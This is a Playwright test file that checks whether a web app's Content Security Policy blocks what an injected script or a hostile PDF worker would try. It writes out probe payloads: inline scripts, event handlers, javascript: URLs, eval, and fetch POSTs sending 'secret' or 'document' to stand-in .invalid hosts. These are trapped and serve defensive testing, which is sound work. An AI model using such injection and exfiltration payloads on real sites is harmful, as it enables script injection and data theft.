import { readdirSync } from "node:fs";
import path from "node:path";
import type { BrowserContext } from "@playwright/test";
import { expect, withCspWatch as test } from "./fixtures";

// M7C (ADR-034): the policy is only worth having if the browser really refuses
// what it should. These tests do what an attacker who found a way to put markup
// or script on a page would try, and check that nothing ran, nothing left the
// browser, and the browser said so. They run under the CSP watch only: the
// request audit used by the tool tests would call the attempts "third-party
// requests", which is what they are. Every off-site address is on the reserved
// `.invalid` domain and goes through a trap, so nothing real is ever contacted
// and a request that got past the policy would be caught and counted.

const OFFSITE = "https://csp-probe.invalid";

async function trapOffsite(context: BrowserContext): Promise<string[]> {
  const reached: string[] = [];
  await context.route("**/*.invalid/**", (route) => {
    reached.push(route.request().url());
    return route.abort();
  });
  return reached;
}

test("the page refuses what an injected script or markup would try", async ({
  page,
  context,
  cspViolations,
}) => {
  const reached = await trapOffsite(context);
  // A script from this origin is allowed to run, as the app's own files are.
  // What it may not do is turn text into code. (Code the test itself runs
  // through the debugger is exempt from the policy, so this has to be a script
  // the page loads.)
  await context.route("**/__probe/gadget.js", (route) =>
    route.fulfill({
      contentType: "text/javascript",
      body: `
        window.__probe_gadget = "ran";
        try { window.__probe_eval = String(eval("1 + 1")); } catch { window.__probe_eval = "refused"; }
        try { window.__probe_function = String(new Function("return 2")()); } catch { window.__probe_function = "refused"; }
        setTimeout("window.__probe_timeout = 'ran'", 0);
      `,
    }),
  );
  await page.goto("/");
  const origin = new URL(page.url()).origin;

  const result = await page.evaluate(async (offsite) => {
    const w = window as unknown as Record<string, unknown>;
    const out: Record<string, string> = {};
    const settle = (ms: number) =>
      new Promise<void>((resolve) => setTimeout(resolve, ms));

    // 1. Code written into the page.
    const script = document.createElement("script");
    script.textContent = "window.__probe_inline = 'ran'";
    document.body.append(script);
    document.body.insertAdjacentHTML(
      "beforeend",
      '<img id="probe-img" alt="" onload="window.__probe_handler = \'ran\'" ' +
        'src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">',
    );
    const anchor = document.createElement("a");
    anchor.href = "javascript:window.__probe_javascript = 'ran'";
    document.body.append(anchor);
    anchor.click();

    // 2. A script of ours, turned against us: it may run but not build code.
    await new Promise<void>((resolve) => {
      const gadget = document.createElement("script");
      gadget.src = "/__probe/gadget.js";
      gadget.onload = () => resolve();
      gadget.onerror = () => resolve();
      document.body.append(gadget);
    });
    try {
      const dataModule: string =
        "data:text/javascript,window.__probe_data_import='ran'";
      await import(dataModule);
    } catch {
      /* refused, as intended */
    }

    // 3. Code or data from another site.
    const external = document.createElement("script");
    external.src = `${offsite}/x.js`;
    document.body.append(external);
    new Image().src = `${offsite}/pixel.png`;
    try {
      await fetch(`${offsite}/exfil`, { method: "POST", body: "secret" });
      out.fetch = "sent";
    } catch {
      out.fetch = "refused";
    }
    try {
      new WebSocket("wss://csp-probe.invalid/socket");
    } catch {
      /* refused, as intended */
    }

    // 4. Another document inside this one, or a form sent away.
    const frame = document.createElement("iframe");
    frame.src = "/about";
    document.body.append(frame);
    const form = document.createElement("form");
    form.method = "post";
    form.action = "/about";
    document.body.append(form);
    const before = location.href;
    form.submit();

    // 5. Rewriting where relative addresses point.
    document.head.insertAdjacentHTML("beforeend", `<base href="${offsite}/">`);

    // 6. Code that makes a worker out of text.
    try {
      const blobWorker = new Worker(
        URL.createObjectURL(new Blob(["self.postMessage('ran')"])),
      );
      blobWorker.onmessage = () => {
        out.blobWorker = "ran";
      };
    } catch {
      out.blobWorker = "refused";
    }

    // 7. Styling that is written as text.
    document.body.insertAdjacentHTML(
      "beforeend",
      '<p id="probe-attr" style="color: rgb(255, 0, 0)">x</p>' +
        "<style>#probe-elem { color: rgb(255, 0, 0) }</style>" +
        '<p id="probe-elem">x</p>',
    );

    await settle(800);
    const color = (id: string) =>
      getComputedStyle(document.getElementById(id)!).color;
    return {
      out,
      ran: {
        inline: w.__probe_inline,
        handler: w.__probe_handler,
        javascript: w.__probe_javascript,
        timeout: w.__probe_timeout,
        dataImport: w.__probe_data_import,
      },
      gadget: {
        ran: w.__probe_gadget,
        eval: w.__probe_eval,
        newFunction: w.__probe_function,
      },
      stayedOnPage: location.href === before,
      baseUri: document.baseURI,
      attrColor: color("probe-attr"),
      elemColor: color("probe-elem"),
    };
  }, OFFSITE);

  // Nothing ran.
  expect(result.ran).toEqual({
    inline: undefined,
    handler: undefined,
    javascript: undefined,
    timeout: undefined,
    dataImport: undefined,
  });
  expect(result.gadget).toEqual({
    ran: "ran",
    eval: "refused",
    newFunction: "refused",
  });
  expect(result.out.blobWorker).not.toBe("ran");
  expect(result.stayedOnPage).toBe(true);
  expect(result.baseUri.startsWith(origin)).toBe(true);
  expect(result.attrColor).not.toBe("rgb(255, 0, 0)");
  expect(result.elemColor).not.toBe("rgb(255, 0, 0)");

  // Nothing left the browser.
  expect(reached, "requests that got past the policy").toEqual([]);

  // And the browser said what it refused, for each kind of attempt.
  const refused = cspViolations.take().join("\n");
  for (const [what, pattern] of [
    ["inline code and handlers", /script-src/],
    ["off-site requests", /connect-src/],
    ["off-site images", /img-src/],
    ["frames", /frame-src|child-src|default-src/],
    ["a worker made from text", /worker-src|child-src|script-src/],
    ["form posts", /form-action/],
    ["a <base> rewrite", /base-uri/],
    ["inline styles", /style-src/],
  ] as const)
    expect(refused, what).toMatch(pattern);
});

test("the policy still allows what the tools need", async ({
  page,
  cspViolations,
}) => {
  await page.goto("/");
  const result = await page.evaluate(async () => {
    // Styling through the style object, which React uses.
    const p = document.createElement("p");
    document.body.append(p);
    p.style.color = "rgb(0, 128, 0)";
    // This origin's own data.
    const response = await fetch("/robots.txt");
    // In-memory images, as previews and results are.
    const image = new Image();
    const loaded = new Promise<string>((resolve) => {
      image.onload = () => resolve("loaded");
      image.onerror = () => resolve("failed");
    });
    image.src = URL.createObjectURL(
      await new Promise<Blob>((resolve) => {
        const canvas = document.createElement("canvas");
        canvas.width = canvas.height = 2;
        canvas.toBlob((blob) => resolve(blob!), "image/png");
      }),
    );
    // A stylesheet rule added through the style API.
    const sheet = new CSSStyleSheet();
    sheet.insertRule("p { text-decoration: underline }");
    document.adoptedStyleSheets = [sheet];
    return {
      color: getComputedStyle(p).color,
      robots: response.status,
      image: await loaded,
    };
  });
  expect(result).toEqual({
    color: "rgb(0, 128, 0)",
    robots: 200,
    image: "loaded",
  });
  expect(cspViolations.take()).toEqual([]);
});

// A worker takes its limits from the response of its own script, so the
// script files carry a policy of their own. This starts a worker from the real
// worker script of the PDF tools, with its body swapped for what a hostile
// document might manage to run inside a worker, and checks it can neither
// send anything off-site nor evaluate text. The same body is run once without
// the policy header to show the trap would have caught a leak.
const WORKER_FILE = readdirSync(
  path.resolve(import.meta.dirname, "../.next/static/chunks"),
).find((name) => name.startsWith("turbopack-worker-"));

const HOSTILE_WORKER = `
(async () => {
  const out = {};
  try { await fetch("https://csp-probe.invalid/leak", { method: "POST", body: "document" }); out.fetch = "sent"; } catch { out.fetch = "refused"; }
  try { out.eval = String(eval("6 * 7")); } catch { out.eval = "refused"; }
  try { importScripts("https://csp-probe-scripts.invalid/x.js"); out.importScripts = "ran"; } catch { out.importScripts = "refused"; }
  try { await WebAssembly.instantiate(new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0])); out.wasm = "allowed"; } catch { out.wasm = "refused"; }
  try { out.sameOrigin = (await fetch("/robots.txt")).status; } catch { out.sameOrigin = "failed"; }
  postMessage(out);
})();
`;

async function runHostileWorker(
  page: import("@playwright/test").Page,
  context: BrowserContext,
  withPolicy: boolean,
) {
  const reached = await trapOffsite(context);
  await page.route(`**/_next/static/chunks/${WORKER_FILE}`, async (route) => {
    const original = await route.fetch();
    const headers = { ...original.headers() };
    if (!withPolicy) delete headers["content-security-policy"];
    delete headers["content-length"];
    await route.fulfill({
      status: 200,
      headers: { ...headers, "content-type": "text/javascript" },
      body: HOSTILE_WORKER,
    });
  });
  await page.goto("/");
  const result = await page.evaluate(
    (file) =>
      new Promise<Record<string, unknown>>((resolve) => {
        const worker = new Worker(`/_next/static/chunks/${file}`);
        worker.onmessage = (event) => resolve(event.data);
        worker.onerror = (event) => resolve({ error: event.message });
        setTimeout(() => resolve({ error: "no answer" }), 10_000);
      }),
    WORKER_FILE,
  );
  return { result, reached };
}

test("there is a worker script to test", () => {
  expect(WORKER_FILE).toBeTruthy();
});

test("a worker without the policy could send a document away (the trap works)", async ({
  page,
  context,
}) => {
  const { result, reached } = await runHostileWorker(page, context, false);
  expect(result.eval).toBe("42");
  expect(reached.some((url) => url.includes("csp-probe.invalid/leak"))).toBe(
    true,
  );
});

test("a worker with the policy can neither send anything off-site nor evaluate text", async ({
  page,
  context,
}) => {
  const { result, reached } = await runHostileWorker(page, context, true);
  expect(result).toEqual({
    fetch: "refused",
    eval: "refused",
    importScripts: "refused",
    // The PDF reader needs this one; nothing else is added with it.
    wasm: "allowed",
    sameOrigin: 200,
  });
  expect(reached, "requests that got past the worker policy").toEqual([]);
});
